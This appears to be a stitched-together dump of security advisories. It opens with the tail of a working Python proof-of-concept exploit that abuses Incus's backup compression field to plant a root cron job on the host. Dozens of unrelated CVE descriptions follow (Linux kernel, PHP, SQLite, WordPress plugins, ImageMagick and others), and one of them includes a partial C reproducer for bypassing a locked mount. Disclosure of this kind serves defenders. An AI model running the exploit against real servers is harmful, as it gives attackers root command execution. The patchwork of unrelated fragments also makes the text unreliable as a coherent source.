    zstd -c -d -f --pass-through -o /etc/cron.d/incus-zstd-rce -- <source>

The direct backup may fail after zstd runs; the host file write is the primitive.
Use only on an authorized Incus server.
"""

from __future__ import annotations

import argparse
import json
import os
import shlex
import sys
import urllib.parse
from pathlib import PurePosixPath
from typing import Any

import requests


def q(value: str) -> str:
    return urllib.parse.quote(value, safe="")


def api(base: str, endpoint: str, **params: str) -> str:
    return base.rstrip("/") + endpoint + ("?" + urllib.parse.urlencode(params) if params else "")


def project_instance(project: str, instance: str) -> str:
    return instance if project == "default" else f"{project}_{instance}"


def clean_guest_path(path: str) -> str:
    if not path.startswith("/"):
        raise ValueError("--guest-path must be absolute")
    if ".." in PurePosixPath(path).parts:
        raise ValueError("--guest-path must not contain '..'")
    return os.path.normpath("/" + path.lstrip("/")).lstrip("/")


def source_path(args: argparse.Namespace) -> str:
    if args.source_host_path:
        return args.source_host_path
    return os.path.join(
        args.incus_dir,
        "storage-pools",
        args.pool,
        args.storage_kind,
        project_instance(args.project, args.instance),
        "rootfs",
        clean_guest_path(args.guest_path),
    )


def cron(command: str) -> bytes:
    return f"* * * * * root /bin/sh -c {shlex.quote(command)}\n".encode()


def session(args: argparse.Namespace) -> requests.Session:
    s = requests.Session()
    s.verify = False if args.insecure else (args.cacert or True)
    if args.cert or args.key:
        s.cert = (args.cert, args.key)
    if args.token:
        s.headers["Authorization"] = "Bearer " + args.token
    s.headers["User-Agent"] = "incus-zstd-backup-rce-poc"
    if args.insecure:
        requests.packages.urllib3.disable_warnings()  # type: ignore[attr-defined]
    return s


def check(resp: requests.Response, what: str) -> requests.Response:
    if resp.status_code >= 400:
        try:
            detail: Any = resp.json()
        except Exception:
            detail = resp.text[:2048]
        raise RuntimeError(f"{what} failed: HTTP {resp.status_code}: {detail}")
    return resp


def upload(s: requests.Session, args: argparse.Namespace, payload: bytes) -> None:
    url = api(args.url, f"/1.0/instances/{q(args.instance)}/files", project=args.project, path=args.guest_path)
    headers = {
        "Content-Type": "application/octet-stream",
        "X-Incus-type": "file",
        "X-Incus-write": "overwrite",
        "X-Incus-uid": "0",
        "X-Incus-gid": "0",
        "X-Incus-mode": "0644",
    }
    print(f"[*] uploading cron payload to {args.instance}:{args.guest_path}")
    check(s.post(url, data=payload, headers=headers, timeout=args.timeout), "payload upload")


def trigger_backup(s: requests.Session, args: argparse.Namespace, body: dict[str, Any]) -> None:
    url = api(args.url, f"/1.0/instances/{q(args.instance)}/backups", project=args.project)
    print("[*] sending direct backup request")
    resp = s.post(
        url,
        data=json.dumps(body).encode(),
        headers={"Accept": "application/octet-stream", "Content-Type": "application/json"},
        timeout=args.timeout,
        stream=True,
    )
    print(f"[*] backup HTTP {resp.status_code}")
    resp.close()
    if resp.status_code >= 400:
        print("[*] HTTP error after compressor launch is possible; check whether the cron file was written")


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Remote Incus zstd backup-compression cron RCE PoC")
    p.add_argument("--url", required=True, help="https://host:8443")
    p.add_argument("--cert", help="client certificate PEM")
    p.add_argument("--key", help="client private key PEM")
    p.add_argument("--cacert", help="CA certificate PEM")
    p.add_argument("--token", help="bearer token")
    p.add_argument("--insecure", action="store_true", help="disable TLS verification")
    p.add_argument("--timeout", type=int, default=180)

    p.add_argument("--project", default="default")
    p.add_argument("--instance", required=True)
    p.add_argument("--pool", default="default")
    p.add_argument("--storage-kind", choices=["containers", "virtual-machines"], default="containers")
    p.add_argument("--incus-dir", default="/var/lib/incus")
    p.add_argument("--guest-path", default="/incus-zstd-cron")
    p.add_argument("--source-host-path", help="override daemon-readable host path for the staged payload")
    p.add_argument("--cron-path", default="/etc/cron.d/incus-zstd-rce")
    p.add_argument("--command", default="date >/incus-zstd-rce; id >>/incus-zstd-rce")

    p.add_argument("--execute", action="store_true", help="stage payload and send backup request")
    p.add_argument("--yes-i-understand-this-writes-host-file", action="store_true", help="required with --execute")
    args = p.parse_args()

    if urllib.parse.urlparse(args.url).scheme != "https":
        p.error("--url must use https")
    if bool(args.cert) != bool(args.key):
        p.error("--cert and --key must be supplied together")
    if args.execute and not args.yes_i_understand_this_writes_host_file:
        p.error("--execute requires --yes-i-understand-this-writes-host-file")
    try:
        clean_guest_path(args.guest_path)
    except ValueError as exc:
        p.error(str(exc))

    args.url = args.url.rstrip("/")
    return args


def main() -> int:
    args = parse_args()
    src = source_path(args)
    payload = cron(args.command)
    compressor = f"zstd -d -f --pass-through -o {shlex.quote(args.cron_path)} -- {shlex.quote(src)}"
    body = {"compression_algorithm": compressor, "instance_only": True}

    print("[*] target:", args.url)
    print("[*] project:", args.project)
    print("[*] instance:", args.instance)
    print("[*] source host path:", src)
    print("[*] cron path:", args.cron_path)
    print("[*] payload:", payload.decode().rstrip())
    print("[*] backup body:", json.dumps(body, sort_keys=True))

    if not args.execute:
        print("[*] dry run only; add --execute and the confirmation flag to act")
        return 0

    s = session(args)
    upload(s, args, payload)
    trigger_backup(s, args, body)
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except BrokenPipeError:
        raise SystemExit(1)
    except Exception as exc:
        print(f"[-] {exc}", file=sys.stderr)
        raise SystemExit(1)
```


### Impact

Improperly validated compression algorithm argument leads to argument
injection leading to arbitrary file write with `zstd` and possibly
arbitrary command execution.
Incorrect authorization in DevTools in Google Chrome prior to 158.0.8127.36 allowed a local attacker to bypass system access restrictions via a crafted HTML page. (Chromium security severity: Low)
Missing authentication for critical function in Windows StateRepository API allows an authorized attacker to perform tampering locally.

items.title: Next.js: SVG rejection bypass in the image optimization
items.description: On self-hosted deployments, the Next.js image optimizer (`/_next/image`) can be made to process an attacker-supplied SVG even when SVG support is disabled with `dangerouslyAllowSVG: false` (the default). This reaches an SVG parser the application intended to keep disabled, increasing exposure to denial of service and SVG decoder vulnerabilities.

items.title: CAPTCHA for Drupal 7 exposes login validation feedback after failed CAPTCHA
items.description:
Observable Discrepancy vulnerability in Drupal CAPTCHA for Drupal 7 allows unauthenticated attackers to test login credentials despite CAPTCHA protection.

When CAPTCHA is enabled on Drupal login forms, normal form validation can still run after a missing or incorrect CAPTCHA response. This may expose credential validation feedback and allow an attacker to distinguish invalid credentials from valid credentials paired with a failed CAPTCHA.



This issue affects CAPTCHA for Drupal 7: from 7.x-1.0 through 7.x-1.7.

ImageMagick before 7.1.2-35 contains a denial of service vulnerability in the BGR, CMYK, GRAY, RGB, YCBCR and YUV decoders that allows attackers to crash the application. Attackers can supply a crafted image to these decoders to trigger a crash and disrupt image processing services.

ImageMagick before 7.1.2-35 contains a policy bypass vulnerability in various coders that allows attackers to allocate excessive memory by supplying images with many profiles. Attackers can craft images containing a high number of embedded profiles to exhaust memory and cause denial of service, bypassing security policy limits.

ImageMagick before 7.1.2-35 contains a policy bypass vulnerability in the ASE decoder caused by a missing security policy check. Attackers can supply crafted ASE files that evade configured resource policies to cause excessive memory usage and denial of service.

items.title: FFmpeg through 9.1 Insecure Default Binding in zmq and azmq Filters
items.description: FFmpeg through 9.1 contains an insecure default configuration in the zmq and azmq filters of libavfilter/f_zmq.c that binds an unauthenticated command socket to all interfaces on TCP port 5555. Remote attackers can send 'TARGET COMMAND [ARG]' messages passed to avfilter_graph_send_command() to change filter runtime parameters and alter processed audio or video.

When NGINX Plus or NGINX Open Source is configured to require client certificates ("ssl_verify_client on") in a non-default stream virtual server, a remote attacker could bypass verification of client certificates.

Impact:
An attacker could leverage this vulnerability to bypass verification of client certificates. There is no control plane exposure; this is a data plane issue only.



Note: Software versions which have reached End of Technical Support (EoTS) are not evaluated.

In the Linux kernel, the following vulnerability has been resolved:

ksmbd: fix heap out-of-bounds write in krb5_authenticate()

In krb5_authenticate(), out_len is calculated to determine available
headroom in response_buf for the incoming Kerberos AP-REP token. However,
when SMB2_SESSION_SETUP is processed as a non-first element of a compounded
SMB2 request, the calculation omits work->next_smb2_rsp_hdr_off.

This causes out_len to overstate remaining buffer headroom by
the cumulative size of prior responses in the compound chain. Consequently,
the length check in ksmbd_krb5_authenticate()
(*out_len <= resp->spnego_blob_len) passes erroneously, allowing memcpy()
to write the AP-REP blob past the end of response_buf into adjacent kernel
heap memory.

Fix this by subtracting work->next_smb2_rsp_hdr_off when computing out_len,
ensuring it accurately reflects physical remaining buffer space.

Portabase is a database backup and restore tool for PostgreSQL, MySQL, MsSQL, MariaDB, Firebird SQL, SQLite, MongoDB, Redis, Files and Docker Volume. Prior to version 1.21.2, a path traversal in the TUS upload webhook handler (app/api/tus/hooks/route.ts) allowed an unauthenticated attacker to overwrite arbitrary files under the private data directory, including /data/private/keys/master_key.bin (the AES-256-GCM master key). This issue has been patched in version 1.21.2.

items.title: Action Pack: Possible sensitive session information leak in Active Storage proxy mode
items.description: Action Pack is a framework for handling and responding to web requests. Prior to 8.1.4.1 and 8.0.5.2, When ActionDispatch::Cookies reads a signed or encrypted cookie that was written under a rotated secret (config.action_dispatch.cookies_rotations) or in the format that a :hybrid cookie serializer migrates from, it writes the cookie back to the response in the current format, and that write ignores request.session_options[:skip]. ActiveStorage::DisableSession relies on that option to keep the session cookie off the public, immutable responses of the Active Storage proxy controllers, but those controllers still load the session, so a request carrying an old-format session cookie could receive the rewritten session cookie in Set-Cookie on a cacheable response. A shared cache that stores such a response together with its Set-Cookie header could then serve one user's session to later requesters of the same URL, or serve an attacker's session to other users. Applications are affected when they serve Active Storage files through the proxy controllers, have a cookie rotation or a :hybrid serializer migration configured, and run behind a cache that stores Set-Cookie on public responses. This is a path around the fix for CVE-2024-26144. This issue is fixed in versions 8.1.4.1 and 8.0.5.2.

Validating an untrusted string in exponent notation into a Fraction field computes the full power of ten without any bound: an input of a few bytes takes seconds to validate.

String inputs are passed to the Fraction constructor. For strings in exponent notation (e.g. '1e8000000'), CPython computes the corresponding power of ten as an integer (in Lib/fractions.py).

The issue was fixed in commit 69ed168e9ad465eef4c8d81efb152a93b604daf5. For strings in exponent notation, the exponent is now parsed before calling the Fraction constructor, and exponents larger than 4300 (in absolute value) are rejected.

Impact: denial of service through validation of untrusted input. Affected are applications validating untrusted strings into Fraction fields (in both JSON and Python mode, including in strict mode), using Pydantic from 2.10.0 up to (but excluding) 2.14.0.

From 2.14.0, exponents larger than 4300 (in absolute value) are rejected, matching the maximum number of digits accepted for integers.

In the Linux kernel, the following vulnerability has been resolved:

ksmbd: fix overflow in dacloffset bounds check in build_sec_desc()

When the large dacl_offset is provided, dacl_offset + sizeof(struct
smb_acl) overflows on 32-bit builds and the check is passed,
Which makes le16_to_cpu(ppdacl_ptr->size) read out-of-bounds. This
only happens for dacl_offset in range [0xFFFFFFF8, 0xFFFFFFFF]. So
the oob read is max 8 bytes preceding the allocated ppntsd.

    unsigned int dacl_offset = le32_to_cpu(ppntsd->dacloffset);
    int ppdacl_size, ntacl_size = ppntsd_size - dacl_offset;

    if (!dacl_offset ||
	(dacl_offset + sizeof(struct smb_acl) > ppntsd_size))
	    goto out;

Commit beff0bc9d69b ("ksmbd: fix overflow in dacloffset bounds check")
fixes similar checks in other functions. But leaves this one out,
because it is only valid for 32-bit builds.

Reproduced on 32-bit ARM with KASAN, by a client sending SMB2
SET_INFO(SEC) with dacloffset=0xfffffff8, then QUERY_INFO(SEC) on the
same file:

 BUG: KASAN: slab-out-of-bounds in build_sec_desc (fs/smb/server/smbacl.c:1105)
 Read of size 2 at addr c2a273fa by task kworker/1:1/35
 CPU: 1 UID: 0 PID: 35 Comm: kworker/1:1 Not tainted 7.3.0-rc2+ #5
 Workqueue: ksmbd-io handle_ksmbd_work
 Call trace:
  kasan_check_range from build_sec_desc (fs/smb/server/smbacl.c:1105)
  build_sec_desc from smb2_query_info (fs/smb/server/smb2pdu.c:7676)
  smb2_query_info from handle_ksmbd_work (fs/smb/server/server.c:160)
  handle_ksmbd_work from process_one_work (kernel/workqueue.c:3401)
  process_one_work from worker_thread (kernel/workqueue.c:3473)
  worker_thread from kthread (kernel/kthread.c:436)

Add overflow check.
Out-of-bounds read in Windows Smart Card allows an authorized attacker to disclose information with a physical attack.

PHP-FPM epoll use-after-free can lead to local privilege escalation.

When catch_workers_output is enabled and the epoll event backend is used, the PHP-FPM master can close a worker's output pipe in fpm_child_close() without removing the associated event, and the delayed cleanup can free the worker record while its epoll registration is still active. A later event is then dispatched through a pointer into freed memory. A local attacker who can execute PHP code in an FPM worker can crash the master or execute code with its privileges, commonly root. catch_workers_output is disabled by default but enabled in the official PHP-FPM Docker images.

This issue affects PHP versions from 8.1.20 through 8.1.34, from 8.2.7 before 8.2.36, 8.3.* before 8.3.37, 8.4.* before 8.4.28 and 8.5.* before 8.5.13.

Incorrect RFC 3986 URI serialization for oversized input.

The Uri\Rfc3986\Uri class does not correctly handle the output-size limit and errors of the uriparser library when converting a URI back to a string. For a URI whose string representation reaches approximately 2 GiB, toString(), toRawString() and other serializing operations can return a truncated or invalid string instead of an error. An application that accepts attacker-controlled URI data of that size, has enough memory to process it and trusts the result may make incorrect validation or routing decisions, and the large allocations can exhaust memory. parse_url() and Uri\WhatWg\Url are not affected.

This issue affects PHP versions 8.5.* before 8.5.13.

Double free during DOM XML serialization.

The XML serializer of Dom\XMLDocument and Dom\HTMLDocument can share ownership of a generated namespace prefix between the namespace-prefix maps of an element and a descendant, so the prefix is used after being freed and then freed a second time. The document does not need to be malformed. An application that parses attacker-controlled XML or HTML with these classes and serializes it with saveXml() can be crashed, and repeated requests can cause denial of service. Code execution has not been demonstrated.

This issue affects PHP versions 8.4.* before 8.4.28 and 8.5.* before 8.5.13.

SOAP use-after-free when processing DTD entity references.

The SOAP extension frees the document type definition (DTD) of a parsed XML document while attribute values can still refer to entities it owns, and can then read freed memory. Removing the DTD also bypasses the SOAP server's rejection of documents that contain one. An unauthenticated remote attacker who can send a crafted request to a SOAP endpoint, or who controls a WSDL or schema document loaded by the application, can crash the PHP process and cause denial of service. Memory disclosure and code execution have not been confirmed.

This issue affects PHP versions before 8.2.36, 8.3.* before 8.3.37, 8.4.* before 8.4.28 and 8.5.* before 8.5.13.

SOAP information disclosure through malformed array dimensions.

The SOAP extension reads an uninitialized array position when decoding an encoded array whose arraySize attribute is empty, whitespace-only or non-numeric, or when such dimensions come from a WSDL definition. Four bytes of unrelated heap data can then be used as an integer key in the decoded array. An unauthenticated remote client can trigger this with a crafted request to a SoapServer endpoint, and a malicious SOAP server with a response to SoapClient. Heap memory is disclosed only if the application returns or otherwise exposes the decoded array.

This issue affects PHP versions before 8.2.36, 8.3.* before 8.3.37, 8.4.* before 8.4.28 and 8.5.* before 8.5.13.
Improper control of generation of code ('code injection') in Microsoft Exchange Server allows an authorized attacker to execute code over a network.
Improper input validation in Microsoft Exchange Server allows an authorized attacker to execute code over a network.
Authorization bypass through user-controlled key in Microsoft Exchange Server allows an authorized attacker to elevate privileges over a network.
Reliance on untrusted inputs in a security decision in Microsoft Exchange Server allows an authorized attacker to elevate privileges over a network.

In the Linux kernel, the following vulnerability has been resolved:

namespace: unhash a dentry before detaching the mounts on it

unlink(), rmdir() and rename() remove the entry from the filesystem,
call detach_mounts() on the entry with the inode locked and then call
d_delete() once the inode is unlocked.

The thing is that between detach_mounts() and d_delete() the dentry is
still hashed and positive. But after detach_mounts() nothing covers the
dentry anymore. A lookup that finds this dentry in the dcache can
uncover what the mounts hid.

That's a problem when unlinking files or directories that are
mountpoints in other mount namespaces. Everybody who had the underlying
entry covered can race the detach_mount() call until d_delete() has run.

The race window isn't all that small. It encompasses namespace_unlock()
with a full synchronize_rcu_expedited() grace period and the
inode_unlock() of the entry.

In my experiments three walkers that kept trying read an overmounted
file in 11938 of the 16140 unlinks that removed its mountpoint from a
bind mount of the filesystem within a minute.

Fun fact, d_invalidate() has the same ordering problem but gets it
right. It unhashes the dentry first and detaches the mounts afterwards.
Let's do the same in __detach_mounts():

- A lookup that hasn't found the dentry yet misses it in the dcache and
  waits for the directory lock that the caller holds until the name is
  gone for good.

- A lockless lookup that found it already fails the mount_lock check
  while the dentry still counts as a mountpoint and the d_seq check once
  it doesn't, and retries.

This fixes the lockless path. We still need to fix the reference count
lookup in a follow-up patch.

So d_drop() the dentry. The dentry stays positive and held but can't be
found anymore. Then proceed with the detach and unlink.

Reproducer:

The reads were counted with the program below, three walkers for 60 s
in a VM with 4 CPUs. The race window is stretched with the debug patch

In the Linux kernel, the following vulnerability has been resolved:

KVM: x86: Use active memslots for the per-vCPU MMIO cache

KVM tags the per-vCPU MMIO cache with a memslot generation so that a
memslot update invalidates cached MMIO information.  Both the fill and
validation paths use kvm_memslots(), which unconditionally selects address
space 0, even when the vCPU is running in SMM and using address space 1.

Commit 56f17dd3fbc4 ("kvm: x86: fix stale mmio cache bug") added the
memslot generation to the cache key so that a memslot update could not
leave a stale entry valid.  When commit 699023e23965 ("KVM: x86: add SMM
to the MMU role, support SMRAM address space") added the SMM address space,
these helpers were not converted to use the active memslots.

Consequently, an update to the SMM memslots can leave an entry from the old
SMM address space apparently valid after the vCPU returns to the normal
address space.  A guest can then cause an access to valid RAM at the same
GFN to be returned to userspace as KVM_EXIT_MMIO.

Completing that exit through the VMM's RAM address space writes the backing
page without going through KVM's write-tracking path.  If the page backs a
nested EPT table, KVM can continue using shadow translations derived from
the old contents.  The WARN_ON_ONCE() in kvm_mmu_write_protect_fault()
catches this invalid cache and memslot combination.

Use the vCPU's active memslots when caching and validating the entry.
Memslot generations are unique across address spaces, so the generation
also distinguishes the normal and SMM views.  This matches the MMIO SPTE
cache, which already uses kvm_vcpu_memslots().

On an unpatched current-mainline kernel, a regression test that fills the
cache in SMM and updates only the SMM memslots fails the intended RAM write
and triggers the kvm_mmu_write_protect_fault() warning.  With this change,
the same test completes the RAM write without a warning.  The x86/smm_test,
set_memory_region_test, and memslot_modification_stress_test selftests also
pass.

items.title: Related Posts for WordPress <= 3.0.0 - Missing Authorization to Authenticated (Contributor+) Sensitive Information Exposure via 'rp4wp_create_link' Parameter
items.description: The Related Posts for WordPress plugin for WordPress is vulnerable to Sensitive Information Exposure in versions up to, and including, 3.0.0 via the 'rp4wp_create_link' parameter of the hidden 'rp4wp_link_related' admin page. The handle_create_link() handler verifies the nonce and that the current user can edit the parent post, but never checks that the attacker-supplied child post ID is one the user is allowed to read; LinkRepository::insert() stores the arbitrary child ID without validation, and ManageLinks::render() later calls LinkRepository::get_children() in its no-extra-args fast path, which falls through to array_map('get_post', $child_ids) — bypassing read_private_posts/read_post capability checks — and then echoes esc_html($child->post_title) in the parent's editor meta box. This makes it possible for authenticated attackers, with Contributor-level access and above, to read the titles of arbitrary non-public posts (drafts, pending, private, future, trashed) authored by higher-privileged users by linking those post IDs to a draft they own and then reading the resulting meta box.

items.title: Related Posts for WordPress <= 3.0.0 - Missing Authorization to Authenticated (Contributor+) Sensitive Information Exposure via 'rp4wp_view' Parameter
items.description: The Related Posts for WordPress plugin for WordPress is vulnerable to Sensitive Information Exposure in all versions up to, and including, 3.0.0 via the 'rp4wp_view' parameter. This makes it possible for authenticated attackers, with contributor-level access and above, to extract the titles and publication dates of all private posts site-wide, normally restricted to Editor-level users and above. The page's existing authorization check only verifies edit_posts and edit_post on a parent post the attacker owns, both of which any Contributor satisfies, leaving no effective gate against reading other authors' private posts.

items.title: OpenStation: Desktop Windows, Dock & Virtual Desktops for WP Admin <= 1.1.16 - Missing Authorization to Authenticated (Subscriber+) Arbitrary Placement Modification and Entity Metadata Disclosure via PATCH /files/placements/<id> on orphaned placements
items.description: The OpenStation: Desktop Windows, Dock & Virtual Desktops for WP Admin plugin for WordPress is vulnerable to authorization bypass in all versions up to, and including, 1.1.16. This is due to the plugin not properly verifying that a user is authorized to perform an action. This makes it possible for authenticated attackers, with subscriber-level access and above, to modify arbitrary other users' placement rows (position, sort order, parent folder, and meta) and read serialized metadata — including title, permalink, and post status — of the entities those orphaned placements reference. Exploitation requires at least one orphaned placement to exist — a state produced naturally by the plugin's own trash cascade, which marks a parent folder as trashed while leaving child placements' parent_id intact — and the attacker must first self-enable OpenStation via the save-openstation AJAX endpoint, which requires only the 'read' capability held by every default WordPress role. This was also independently found by the OpenStation team.

In the Linux kernel, the following vulnerability has been resolved:

namespace: a mount that copy_tree() leaves out can't take over a lock

Since commit c62a4766937e ("move_mount: transfer MNT_LOCKED") a mount
can be moved beneath a locked mount. The lock moves from the old cover
to the new mount which takes over the job of hiding what's under it and
the old cover can be unmounted. That works as long as the new mount
stays. But the caller picks the new mount and copy_tree() leaves a
mount of a mount namespace file out of every copy made without
CL_COPY_MNT_NS_FILE, together with everything mounted on it, and never
looks at MNT_LOCKED. unshare(CLONE_NEWNS) and mount propagation make
such copies.

So a task that is root in its own user namespace gets rid of a locked
cover on a file without a race and without touching the filesystem
below it. It makes a child with a mount namespace of its own, binds the
child's /proc/<pid>/ns/mnt beneath the cover with MOVE_MOUNT_BENEATH,
which hands the lock to that bind, and calls unshare(CLONE_NEWNS). The
new mount namespace has nothing on the file. That's the usual way to
mask a single file, a bind of /dev/null or of an empty file. With a
bind of an ordinary file the file stays covered.

copy_tree() already refuses to leave out a locked unbindable mount with
-EPERM since commit df7342b24018 ("mount: Don't allow copying
MNT_UNBINDABLE|MNT_LOCKED mounts"). Do the same for a locked mount of a
mount namespace file. That also covers a tree copied with
CL_COPY_MNT_NS_FILE and attached into a mount namespace of another user
namespace where lock_mnt_tree() locks it. Note that unshare(CLONE_NEWNS)
and clone(CLONE_NEWNS) fail with EPERM from such a mount namespace from
then on. The mount can't be left out and it can't be unmounted.

And refuse to move a mount of a mount namespace file beneath a locked
mount in the first place. Otherwise the task ends up with a mount it
can't unmount and an unshare() that fails for good.

Chris also found a second mount that goes away by itself, a clone of an
automounted mount that shrink_submounts() took along with its parent.
Commit f78ddcc87224 ("namespace: never expire a locked mount") took
care of that one.

Chris's reproducer is appended. Mode nsfile reads SECRET after the
unshare() on 7.3-rc7, with this patch the move_mount() fails with
EINVAL and the file stays covered. nsfile-control uses an ordinary file
and reads MASK both ways.

  // SPDX-License-Identifier: GPL-2.0
  /*
   * Get rid of a locked cover with MOVE_MOUNT_BENEATH.
   *
   * The "admin" (root) makes a tmpfs W:
   *     W/D         file, holds SECRET, covered by a bind of a file with MASK
   *     W/Dd/inner  file, holds SECRET, Dd is covered by a bind of a directory
   *                 whose "inner" holds MASK
   *     W/own       directory of uid 1000 with the file "mine" and the
   *                 directory "minedir", whose "inner" holds MINE
   *     W/dbg       debugfs, mode 755. dbg/tracing is an automount point
   * The "attacker" is uid 1000. It enters a new user namespace with a new mount
   * namespace, so W and both covers are locked there.
   *
   * usage: prog MODE
   *   plain      put a bind of own/mine beneath the cover of D, unmount the cover
   *   nsfile     put a bind of the mount namespace file of a child beneath the
   *              cover of D, then unshare(CLONE_NEWNS)
   *   nsfile-control    the same with a bind of own/mine
   *   shrink     put a bind of the automounted tracefs beneath the cover of Dd,
   *              unmount the cover, put a tmpfs beneath W, call umount(W), which fails
   *   shrink-control    the same with a bind of own/minedir
   * The environment variable AUTOMOUNT_DIR names another automount point for "shrink".
   */
  #define _GNU_SOURCE
  #include <errno.h>
  #include <fcntl.h>
  #include <grp.h>
  #include <sched.h>
  #include <signal.h>
  #include <stdio.h>
  #include <stdlib.h>
  #include <string.h>
  #include <unistd.h>
 
---truncated---

In the Linux kernel, the following vulnerability has been resolved:

firewire: core: fix race condition in split transaction handling

For a split transaction, either fw_core_handle_response() or
split_transaction_timeout_callback() may manipulate the same transaction
entry in the pending transaction list. The return value of timer_delete()
is used to determine which function handles the entry. If the transaction
is a split transaction and timer_delete() returns zero, the timeout
callback may already be running. In this case, the response handler must
leave the entry in the list for the timeout callback to remove.

A previous code refactoring broke this behavior, introducing a race
condition in which both functions could process the same transaction.
This could lead to a use-after-free on the transaction initiator side.

Fix the regression by ensuring that the response handler does not process
the transaction when timer_delete() returns zero. The timeout callback is
responsible for removing the entry from the pending transaction list.

SQLite before 3.54.0 contains a stack exhaustion vulnerability that allows attackers to bypass the SQLITE_LIMIT_EXPR_DEPTH limit by chaining COLLATE postfix operators. Attackers can supply roughly 175,000 chained COLLATE operators in SQL or an untrusted database view to trigger unbounded recursion in sqlite3WalkExprNN() and crash the process.

items.title: psqlODBC uses a server-supplied column name as a format string
items.description: For an updatable cursor over a table without OIDs that has an auto-increment int4 column, psqlODBC places that column's name, as reported by the server, into a printf-style format string. It later expands that string with one argument while it builds the WHERE clause of its positioned SELECT, UPDATE, and DELETE statements. A column name that contains format directives makes the driver read unrelated memory, which can crash the application or copy client memory into query text sent to the server. The name can come from a server not trusted under current SSL settings, or from any database user who can create a table that the application reads with an updatable cursor. Versions before psqlODBC 18.00.0006 are affected.

SQLite before 3.54.0 contains a stack exhaustion vulnerability that allows attackers to bypass the SQLITE_LIMIT_EXPR_DEPTH nesting limit because common table expressions are not counted against it. Attackers can supply a WITH clause chaining tens of thousands of CTEs, via plain SQL or a view in an untrusted database file, causing unbounded selectExpander() recursion that crashes the process.

SQLite before 3.54.0 built with FTS3/FTS4 and SQLITE_ENABLE_FTS3_PARENTHESIS contains a use-after-free vulnerability in fts3BestSnippet() caused by dangling cached position-list pointers. Attackers can run a full-text MATCH query combining OR and NEAR operators with snippet() to read freed heap memory and crash the process.

SQLite before 3.54.0 contains an information disclosure vulnerability that allows attackers to read uninitialized page-cache memory by supplying a WAL file with an undersized page size. Attackers can craft a database and WAL file whose oversized record payload makes queries like substr() return stale bytes, disclosing other table rows and internal pointers.

SQLite before 3.54.0 contains a use-after-free vulnerability in the R-Tree extension that allows attackers to make applications use freed heap memory by manipulating the %_node shadow table. Attackers can supply a database declaring %_node WITHOUT ROWID or with a RAISE(IGNORE) trigger so nodeWrite() hashes nodes as 0, crashing the process after node splits.

SQLite before 3.54.0 contains a stack exhaustion vulnerability in countOfViewOptimization() that allows attackers to crash the host process via count(*) over a large multi-row VALUES clause. Attackers supplying SQL or a database file with a crafted view can trigger deeply nested TK_PLUS expressions whose recursive freeing in sqlite3ExprDeleteNN() exhausts the C stack, causing denial of service.

SQL Injection in the entity engine's generic performFind service in Apache OFBiz 24.09 before 24.09.08 on MySQL/MariaDB-backed deployments allows a remote unauthenticated attacker to disclose arbitrary rows from the queried entity by submitting an ignore-case find request (e.g. _ic=Y) with a crafted value, causing SqlJdbcUtil.addValueSingle to inline the EntityFunction-wrapped value directly into the SQL text using ANSI-only single-quote doubling instead of binding it as a parameter, which is insufficient on MySQL/MariaDB because those dialects also honor backslash escapes, letting a backslash-terminated payload break out of the string literal and turn the WHERE clause into a tautology. The default Derby datasource and PostgreSQL are not affected because they do not interpret backslash as an escape character in this context. Users are recommended to upgrade to version 24.09.08, which fixes this issue.
